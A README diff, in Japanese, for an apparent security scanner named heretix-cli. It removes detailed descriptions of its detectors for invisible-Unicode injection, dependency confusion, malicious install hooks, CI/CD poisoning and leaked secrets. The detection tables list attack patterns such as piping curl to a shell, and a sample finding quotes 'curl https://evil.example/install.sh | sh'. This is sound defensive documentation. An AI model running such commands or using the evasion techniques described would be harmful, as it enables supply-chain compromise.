-- **ホストスキャン時**: `/proc`、`/sys`、`/dev`、`/boot`、`/run`、`/tmp`、`/var/lib/docker`、`/var/lib/containerd`、`/var/lib/kubelet`、`/usr/src`、`/usr/local/lib/python*`、`/usr/lib/python*`
-- **Docker イメージスキャン時**（`--image`）: 上記に加え `/usr/share`、`/usr/lib/locale`、`/usr/lib/node_modules`、`/var/cache`、`/var/lib/apt`、`/var/lib/dpkg`
-
-### GlassWorm 検知
-
-ソースファイル内の不可視・ゼロ幅 Unicode 文字を検出します。レビュアーには見えないが、インタープリタに実行される形でマルウェアを埋め込む攻撃に対応します。
-
-| 文字 | Severity |
-|---|---|
-| U+202A–U+202E BiDi 制御文字（RLO, LRO 等） | CRITICAL |
-| U+2028, U+2029 行区切り・段落区切り | HIGH |
-| U+FEFF BOM（ファイル先頭以外） | HIGH |
-| U+200B/C/D ゼロ幅スペース・結合子 | MEDIUM |
-| U+2060, U+034F ワードジョイナー等 | MEDIUM |
-
-**U+200B/200C/200D のコンテキスト判定**: これらの文字はデーバーナーガリー・アラビア文字・ヘブライ文字・タイ語など非ラテン系スクリプトの合字・改行制御に必須です。隣接文字が両側とも ASCII の場合のみフラグを立てます（コードへの注入パターン）。
-
-対象ファイル: `*.py`, `*.js`, `*.ts`, `*.go`, `*.php`, `*.rb`, `*.lock`, `*.toml`, `*.cfg`（JSON は実行されるコードではないため除外）
-
-**ファイル単位の集約**: 同一文字は出現ごとではなく、ファイル単位で1件にまとめて報告します（最初の出現行と総出現回数を付記）。該当ファイルには同じ文字が多数出現するのが通常であり、対処の単位がファイルと文字の組であるためです。
-
-スキップ: `site-packages`、`dist-packages`、`Trash`、`.Trash`、`node_modules`、`vendor`、`.venv`、`venv`、`__pycache__`、`.tox`、`.git`、`testdata`。`*.min.js` などのミニファイルおよびコンテンツハッシュを含む webpack/vite チャンクファイルも除外。
-
-> `testdata` は全検知器でスキップします。Go ツールチェーンと同様の扱いで、中身はビルドも実行もされないフィクスチャであり、セキュリティツールでは意図的に悪意ある検体を配置するためです。
-
-### Dependency Confusion 検知
-
-内部パッケージ名を公開レジストリに登録し、意図しない公開版がインストールされる攻撃（依存関係混乱攻撃）への脆弱な設定を検出します。
-
-**追加レジストリを前提とした判定**: 置換攻撃には置換元となる第2のレジストリが必要なため、npm・PyPI とも追加レジストリが設定されている場合にのみ検査します。スコープ検査は `.npmrc` が npmjs.org 以外のレジストリを宣言している場合に限り実行します（`.npmrc` の存在自体は判定材料になりません。多くは `shamefully-hoist` などの動作設定のみを含みます）。PyPI 側も同様に、緩いバージョン指定は `--extra-index-url` がある場合にのみ報告します。インデックスが1つの場合、バージョン範囲が別パッケージに解決されることはありません。
-
-`@types`、`@prisma`、`@fastify`、`@nestjs`、`@aws-sdk` など広く知られた公開スコープは自動的に除外します。`--check-registry` を使うと、アローリスト外のスコープを npmjs.org に問い合わせて動的に判定できます。
-
-| チェック内容 | エコシステム | Severity |
-|---|---|---|
-| `.npmrc` が私有レジストリを宣言している状況で、マッピングのないスコープ | npm | HIGH |
-| `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` で社内スコープパッケージが公開レジストリから解決されている | npm | HIGH |
-| 完全に未固定のバージョン（`*`、`latest`、`next`、またはバージョン未指定） | npm | MEDIUM |
-| `requirements.txt` / `pip.conf` に `--extra-index-url`（pip は全インデックスで最高バージョンを選択） | PyPI | HIGH |
-| 範囲指定バージョン（`>=`, `~=`）— **追加インデックス設定時のみ** | PyPI | MEDIUM |
-| `--hash=sha256:` インテグリティチェックなし — **追加インデックス設定時のみ** | PyPI | LOW |
-| 公開 `GOPROXY` かつ内部モジュールパスを `GOPRIVATE` がカバーしていない | Go | HIGH |
-| `go.mod` にあるモジュールが `go.sum` に存在しない | Go | MEDIUM |
-
-`--check-registry` は `https://registry.npmjs.org/-/v1/search?text=scope:<name>&size=1` で未知スコープを検索します。パッケージが1件以上あれば公開スコープとして除外します。1回のスキャン中はキャッシュされます。
-
-### Malicious Install Scripts 検知（Shai-Hulud、RedC2）
-
-npm ライフサイクルフック（`preinstall`、`postinstall`、`prepare` 等）、パッケージのエントリポイント、Python `setup.py` 内の危険なコマンドを検出します。インストール時またはインストール後に自動実行されるため、サプライチェーン攻撃の主要な侵入経路です。
-
-**フックスクリプトの追跡**: フックのコマンド文字列自体は無害な場合が多く、Shai-Hulud ワームでは `node bundle.js` であり、ペイロードは参照先ファイルに存在します。フックがローカルスクリプト（`node x.js`、`python x.py`、`sh x.sh`）を実行する場合、そのファイルの内容も検査対象とします。
-
-**難読化による判別（フックスクリプトのみ）**: インストール時のダウンロードと実行は、ネイティブバイナリを持つパッケージの正当な動作でもあります。esbuild の `install.js` はプラットフォーム別バイナリを取得して実行しており、操作内容は攻撃と同一です。両者の差は可読性にあり、esbuild の最長行は125文字、Shai-Hulud のバンドルは1行が数千文字に達します。このため追跡先スクリプト内でのパターン一致は MEDIUM を上限とし、難読化されたスクリプトの実行自体を HIGH とします。難読化はこの種の検査を回避する目的で行われるためです。
-
-**エントリポイントは判定基準が異なります**: RedC2 キャンペーンは lifecycle フックを一切使いませんでした。ペイロードはパッケージのエントリポイント（`main`/`module`/`exports`）内のトップレベル IIFE で、依存グラフ内のどこかで最初に `import`/`require` された時点で実行されます。`--ignore-scripts` は無力です。ただし、エントリポイントはフックのような「独立した小さなスクリプト」ではなく「パッケージ本体そのもの」なので、上記のフックスクリプト向けの判定基準はそのまま持ち込めません。minify された `dist/index.cjs` はバンドラーがほぼ全てのパッケージで生成する通常の形式であり、`child_process`/Base64 も実際の機能として普通に使われます。ここで検査するのは**detached な spawn** のみです — `spawn(...)`/`exec(...)` と `detached: true` の組み合わせで、ビルド時のヘルパーが Node 終了後もプロセスを生かし続ける正当な理由はどんなビルドでもありません。spawn 対象がローカルファイルに解決できる場合、拡張子に関わらず先頭バイトを ELF（Linux）、PE（Windows、`MZ`）、Mach-O（macOS、universal binary 含む）のマジックナンバーと照合します。同梱バイナリはデータファイルに見える名前（`.bin`、`.dat`）が付けられることが多いためです。RedC2 自体は Linux を標的にしていましたが、detached spawn は Linux 固有の手口ではないため、ELF だけでなく3形式すべてを照合します。
-
-| チェック内容 | エコシステム | Severity |
-|---|---|---|
-| `curl`/`wget` の出力をシェルにパイプ（`\| sh`、`\| bash`） | npm / PyPI | CRITICAL |
-| Base64 デコードしたペイロードをシェルに実行 | npm | CRITICAL |
-| ネットワーク fetch した内容を `eval()` | npm | CRITICAL |
-| `setup.py` 内の `eval()` | PyPI | CRITICAL |
-| エントリポイントが `detached: true` で子プロセスを spawn | npm | CRITICAL |
-| install フックが難読化されたスクリプトを実行 | npm | HIGH |
-| 実行可能な `.pth` ファイル（import 不要で Python 起動のたびに実行される） | PyPI | HIGH |
-| フックコマンド自体に `require('child_process')` / `curl` / `node -e` | npm | HIGH |
-| `setup.py` 内の `exec(compile(...))` 難読化 | PyPI | HIGH |
-| `setup.py` 内の `os.system()` / `subprocess.*()` かつ同一ファイルにネットワーク取得あり | PyPI | HIGH |
-| 上記のフックコマンド系パターンが**追跡先**フックスクリプト内で見つかった場合 | npm | MEDIUM |
-| フック内の Base64 デコード（`Buffer.from(..., 'base64')`） | npm | MEDIUM |
-| install フック内の `fetch()` アウトバウンド呼び出し | npm | MEDIUM |
-| `setup.py` 内のネットワークリクエスト | PyPI | MEDIUM |
-| `setup.py` 内の `os.system()` / `subprocess.*()` 単独 | PyPI | LOW |
-
-`package.json`（`node_modules/` 配下を含む）、各パッケージの解決済みエントリポイント、`setup.py`、`*.pth` を対象にスキャン。
-
-### CI/CD Pipeline Poisoning 検知
-
-ビルドパイプラインを乗っ取ったりシークレットを窃取するために使われる CI/CD 設定ファイルのパターンを検出します。
-
-**`run:` ブロック限定の判定**: YAML のインデントを追跡し、シェル系ルールは実際にシェルへ渡される箇所でのみ判定します。シークレットの扱いに特に影響し、`env: TOKEN: ${{ secrets.X }}` や `with: token: ${{ secrets.X }}` は正規の記述であるため報告しません。シェルコマンドに直接展開された場合（コマンドラインとログに露出する）のみ報告します。
-
-**所有者に基づくアクション固定の判定**: GitHub は first-party アクションについてメジャータグでの固定を推奨しているため、`actions/checkout@v4` は報告しません。サードパーティのタグ固定は LOW で報告します。タグは force-push が可能であり、tj-actions/changed-files の侵害（CVE-2025-30066）はこれを悪用した事例ですが、大半のタグ固定は正常な運用です。
-
-| チェック内容 | 対象システム | Severity |
-|---|---|---|
-| `curl`/`wget` の出力をシェルにパイプ | 全システム | CRITICAL |
-| Base64 デコードしたペイロードをシェルに実行 | 全システム | CRITICAL |
-| ユーザー制御の GitHub イベントデータを `run:` ステップに埋め込み（スクリプトインジェクション） | GitHub Actions | CRITICAL |
-| `pull_request_target` ワークフローが PR 自身の head をチェックアウト | GitHub Actions | CRITICAL |
-| `run:` ステップ内のアウトバウンド `curl`/`wget` | 全システム | HIGH |
-| `run:` 内でシェルコマンドに GitHub シークレットを展開 | GitHub Actions | HIGH |
-| ミュータブルな参照へのアクション固定（`@main`、`@master`、`@latest`） | GitHub Actions | HIGH |
-| 信頼できないトリガから到達可能な self-hosted runner | GitHub Actions | HIGH |
-| `remote: https://` によるリモートパイプライン設定読み込み | GitLab CI | HIGH |
-| `run:` ステップ内の `node -e` / `python -c` インライン実行 | 全システム | MEDIUM |
-| サードパーティアクションのコミット SHA ではなくタグへの固定 | GitHub Actions | LOW |
-
-`pull_request_target` はベースリポジトリのシークレットと特権トークンを持つ文脈で動作するため、ここで PR 自身のコードをチェックアウトすると、外部からの変更をその権限で実行することになります（Nx s1ngularity 侵害の起点）。self-hosted runner はキャッシュされた資格情報と内部ネットワークへの到達性を持つため、信頼できないトリガ（`pull_request_target`、`issue_comment`）から到達可能な場合にのみ報告します。信頼できるトリガのみで使用する self-hosted runner は通常の構成です。
-
-`.github/workflows/*.yml`、`Jenkinsfile`、`.gitlab-ci.yml`、`.circleci/config.yml`、`azure-pipelines.yml`、`bitbucket-pipelines.yml` を対象にスキャン。
-
-### Hardcoded Secrets 検知
-
-> **注: 一時的に無効化されています。** 検知ロジックは実装済みですが、現在は実行されません。
-
-ソースコードや設定ファイルに直接コミットされた認証情報・API キーを、2 つの手法で検出します。
-
-**既知フォーマットパターン**（コンテキスト不問でフラグ）:
-
-| シークレット種別 | Severity |
-|---|---|
-| AWS Access Key ID（`AKIA...`） | CRITICAL |
-| GitHub トークン（`ghp_`、`ghs_`、`gho_`、`github_pat_`） | CRITICAL |
-| npm アクセストークン（`npm_...`） | CRITICAL |
-| Slack トークン（`xox[baprs]-...`） | CRITICAL |
-| Stripe Live シークレットキー（`sk_live_...`） | CRITICAL |
-| SendGrid API キー（`SG....`） | CRITICAL |
-| Google API キー（`AIza...`） | CRITICAL |
-| Google OAuth クライアントシークレット（`GOCSPX-...`） | CRITICAL |
-| PEM 秘密鍵ヘッダ | CRITICAL |
-| JWT（JSON Web Token） | HIGH |
-| Stripe テストシークレットキー（`sk_test_...`） | MEDIUM |
-
-**エントロピー検知**: `api_key = "..."` や `token: "..."` などの代入パターンで値を抽出し、Shannon エントロピー ≥ 4.5 bits/文字 のものをフラグ。純粋な16進数文字列（コミットハッシュ等）は除外。
-
-プレースホルダ値（`changeme`、`YOUR_KEY_HERE`、`<token>`、環境変数参照 `$MY_SECRET` 等）は自動除外。シークレット値は出力で `先頭6文字***` にマスクされ、ログへの認証情報漏洩を防止。
-
-`.go`、`.py`、`.js`、`.ts`、`.rb`、`.php`、`.java`、`.cs`、`.sh`、`.bash`、`.env`、`.yaml`、`.yml`、`.toml`、`.json`、`.xml`、`.ini`、`.cfg`、`.conf`、`.properties`、`.tf` を対象にスキャン。`*.example`、`*.template`、`*_test.go`、`*.spec.ts` 等はスキップ。`target/`、`.next/`、`.nuxt/` も除外ディレクトリに追加。
-
-### Lock File Integrity 検知
-
-ロックファイルの弱いハッシュや欠落を検出し、マニフェストとロックファイルのドリフト（不整合）を確認します。
-
-| チェック内容 | 対象ファイル | Severity |
-|---|---|---|
-| 直接依存が SHA-1 integrity を使用（衝突攻撃が可能な破損済みアルゴリズム） | `package-lock.json` | HIGH |
-| `package.json` に宣言されているが `package-lock.json` に存在しない | `package-lock.json` | MEDIUM |
-| `go.mod` の require にあるモジュールが `go.sum` に存在しない（未検証） | `go.sum` | MEDIUM |
-| `Pipfile.lock` のパッケージにハッシュエントリがない（インストール時に整合性検証不可） | `Pipfile.lock` | MEDIUM |
-
-## 出力例
-
-### テーブル出力 (デフォルト)
-
-```
-Vulnerability Check Report
-==========================
-Source:     inventory.json
-Host:       server01
-Packages:   1523 checked (rpm: 1200, dpkg: 320, pip: 280, npm: 43)
-
-   ECOSYSTEM   PACKAGE               VERSION    SOURCE               DB    VULN ID               CVSS   EPSS  SUMMARY
-   ──────────  ────────────────────  ─────────  ──────────────────── ───   ───────────────────   ────   ────  ──────────────
-!  AlmaLinux   curl                  7.88.1     rpm                  nvd   CVE-2024-1234          9.8  0.950  Remote code exec
-   AlmaLinux   openssl               3.0.11     rpm                  osv   ALSA-2024:5678         7.5  0.123  Buffer overflow
-   Debian      libssl3               3.0.11     dpkg                 nvd   CVE-2024-5678          7.5  0.098  Buffer overflow
-   PyPI        requests              2.31.0     /srv/myapp/requir... osv   GHSA-xxxx-yyyy         6.1  0.045  SSRF via proxy
- K Debian      linux-libc-dev        6.12.43-1  dpkg                 osv   CVE-2024-4321          7.8  0.010  Kernel use-after-free
- B Debian      binutils(2 pkgs)      2.44-3     dpkg                 osv   CVE-2024-9999          5.5  0.002  Heap overflow in BFD
-~  PyPI        somepkg               v2024.1    pip                  osv   GHSA-zzzz-zzzz         6.0      -  Some vulnerability
-#  npm         malicious-pkg         1.0.0      pnpm-lock.yaml       osv   MAL-2024-1234            -      -  Malicious package
-
-# = malicious package (OSSF Malicious Packages)
-! = in CISA Known Exploited Vulnerabilities (KEV) catalog
-~ = approximate match (version could not be normalized, showing all vulnerabilities for this package)
-K = kernel headers (the host kernel runs, not this package's code)
-B = build toolchain (compiler, linker or development headers left from a build stage)
-(N pkgs) = the same vulnerability in N binary packages built from this source package (PACKAGE names the source package)
-multiple = the binary packages in this row do not share one version
-DB = data source (osv = Open Source Vulnerabilities, nvd = NIST NVD, advisory = Vendor Advisory)
-EPSS = Exploit Prediction Scoring System probability (0.000–1.000)
-
-Summary: 14 packages with 21 findings (1 malware, 1 KEV)
-  Malware:          1
-  Critical:         1
-  High:             4
-  Medium:           8
-  Low:              5
-  Non-runtime:      2 (kernel 1, build 1)
-  (counted above; re-run with --runtime-only to exclude them)
-
-Local Security Findings
-=======================
-  TYPE            FILE                                LINE  SEVERITY  DETAIL
-  ─────────────── ─────────────────────────────────── ────  ────────  ────────────────────────────────────
-G glassworm          /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
-D dep-confusion      /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
-D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
-M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
-C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
-L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512
-
-G = GlassWorm（不可視・ゼロ幅文字の混入）
-D = Dependency Confusion（公開レジストリから解決可能な内部パッケージ）
-M = Malicious Install（ライフサイクルフック内の危険なコマンド）
-C = CI/CD Poisoning（パイプライン設定の攻撃パターン）
-L = Lock File Integrity（弱いハッシュまたはマニフェスト／ロックファイルの不整合）
-
-Local findings: 6 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 lockfile-integrity)
-```
-
-### JSON 出力 (`--format json`)
-
-stdout に JSON のみ出力（脆弱性結果と `localFindings` フィールドのローカル検知結果を含む）。進捗ログは stderr に出力されるため、パイプ処理が可能。
-
-`results[]` の各要素には `sourcePackage` と `category`（[非ランタイムパッケージ](#非ランタイムパッケージ) 参照）が付与されており、スクリプト側でソースパッケージ単位の集約ができる。テーブルの集約済み行とは異なり、結果はバイナリパッケージ単位の粒度を保持する。`--runtime-only` はここでも非ランタイムパッケージの結果を除外し、テーブルおよび終了コードと一致させる。`summary.aggregatedFindings` は、その再集約をしなくても集約後の件数（ソースパッケージ+脆弱性単位）を得られるようにするものである。
-
-各脆弱性には、heretix-api が返す修正状況とディストリ固有のフィールドがそのまま含まれる（API に値が無い場合は空文字列）。
-
-| フィールド | 意味 |
-|---|---|
-| `fixedVersion` | この脆弱性が修正されるバージョン（ソースが明示している場合） |
-| `distroPriority` | 該当パッケージに対するディストリ自身の評価（そのまま）。Ubuntu の priority（`negligible`〜`critical`）、Debian の urgency（`unimportant`〜`high`）、Red Hat の impact（`low`〜`critical`）。CVE 全体の `severity` とは異なる場合がある |
-| `fixStatus` | 未修正パッケージに修正が来るかどうか：`affected`、`deferred`、`will_not_fix`、`out_of_support`、`under_investigation`。情報源は Red Hat VEX と Debian security tracker のみ。heretix-api が値を追加する可能性があるため、未知の値は `affected` と同様に扱うこと |
-| `fixStatusDetail` | `fixStatus` に対するソース自身の表現（例：`Will not fix`、Debian tracker のタグと注記） |
-
-## 終了コード
-
-| コード | 意味 |
-|---|---|
-| `0` | 脆弱性・マルウェア・ローカル検知結果なし（collect の場合は成功） |
-| `1` | 脆弱性、マルウェア、またはローカルセキュリティ検知結果あり（CI/CD 連携用） |
-| `2` | 実行失敗 |
-
-## CI/CD での利用例
-
-### ライブシステムスキャン
-
-```bash
-export HERETIX_API_KEY=your-secret-key
-heretix-cli scan --api-url http://heretix-api:5000 --severity 7.0 --format json > /dev/null
-if [ $? -eq 1 ]; then
-  echo "High severity vulnerabilities found!"
-  exit 1
-fi
-```
-
-### Docker イメージスキャン (ビルド後チェック)
+`check`、`scan`、`detect` は、何か検出すると終了コード `1` を返します。そのため、パイプラインのステップはそれだけで失敗扱いになります。
 
 ```bash
 docker build -t myapp:latest .
-heretix-cli scan --image myapp:latest --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
+heretix-cli scan --image myapp:latest --api-url http://heretix-api:5000 --severity 7.0
 ```
 
-### Dockerfile ベースイメージも含めた完全スキャン
+| 終了コード | 意味 |
+|---|---|
+| `0` | 何も検出されなかった（`collect`、`submit` は正常終了） |
+| `1` | 脆弱性、マルウェア、またはローカル検査での検出があった |
+| `2` | コマンドの実行に失敗した |
 
-```bash
-heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile \
-  --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0 --format json > vuln-report.json
-```
+`--severity` で CVSS スコアの下限を指定でき、`--runtime-only` を付けるとカーネルヘッダーとビルドツールチェーンの検出を除外します。`--format json` を指定すると、プログラムで扱いやすい JSON で出力します。GitHub Actions を含むそのほかの例は、[docs/commands.md](docs/commands.md#cicd-examples)（英語）を参照してください。
 
-### Dependabot 連携（GitHub Actions）
+## ドキュメント
 
-```yaml
-- name: パッケージ収集
-  run: heretix-cli collect --output sbom.json
+ドキュメントは英語のみです。
 
-- name: GitHub Dependency Graph に送信
-  run: heretix-cli submit sbom.json
-  env:
-    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-    # GITHUB_REPOSITORY / GITHUB_SHA / GITHUB_REF / GITHUB_RUN_ID は Actions が自動設定
-```
+| ドキュメント | 内容 |
+|---|---|
+| [docs/commands.md](docs/commands.md) | 全コマンドとオプション、出力形式、終了コード、CI/CD の例 |
+| [docs/package-detection.md](docs/package-detection.md) | 各コレクターが読み取るもの、実行時に使われないパッケージと OS 管理のパッケージ |
+| [docs/sbom.md](docs/sbom.md) | SBOM の内容と、ロックファイルごとに埋められる項目 |
+| [docs/local-checks.md](docs/local-checks.md) | ローカルのセキュリティ検査と、その判定ルール |
+| [docs/development.md](docs/development.md) | プロジェクト構成、コレクターや検査の追加方法 |
 
-送信後、Dependabot がスナップショットを解析し、既知の CVE を持つパッケージに対してアラートを生成する。
+## ライセンス
 
-## プロジェクト構成
-
-```
-heretix-cli/
-├── main.go                 # エントリポイント
-├── cmd/                    # CLI コマンド定義 (cobra)
-├── collector/              # パッケージ収集 (Collector インターフェース)
-├── container/              # Docker イメージ取得・展開
-├── inventory/              # 検出リスト JSON スキーマ・I/O
-├── checker/                # 脆弱性 API クライアント
-├── detector/               # ローカルセキュリティ検知 (Detector インターフェース)
-├── report/                 # テーブル・JSON 出力
-├── sbom/                   # CycloneDX SBOM 生成
-└── depgraph/               # GitHub Dependency Submission API クライアント
-```
-
-## 拡張
-
-### 新しいエコシステムコレクターを追加するには
-
-1. `collector/` に `Collector` インターフェースの実装を追加
-2. `collector/collect.go` の `CollectAll` 内のリストに登録
-
-### 新しいローカルセキュリティ検知を追加するには
-
-1. `detector/` に `Detector` インターフェースの実装を追加
-2. `detector/detector.go` の `RunAll` 内のリストに登録
+Apache License 2.0。詳細は [LICENSE](LICENSE) を参照してください。
